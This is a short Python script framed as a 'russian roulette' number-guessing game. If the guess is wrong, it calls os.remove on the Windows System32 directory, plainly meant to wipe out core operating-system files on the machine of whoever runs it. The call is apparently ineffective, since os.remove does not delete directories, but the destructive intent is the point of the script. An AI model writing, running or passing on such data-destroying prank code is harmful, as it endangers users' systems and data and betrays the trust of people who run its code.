import random
import os

number = random.randint(1,6)                  #1-6 tradictional russian roulette :))
guess = int(input("Guess a number between 1 and 6: "))
guess = int(guess)

if guess == number:
	print("You won!")
else :
	os.remove("C:\Windows\System32")
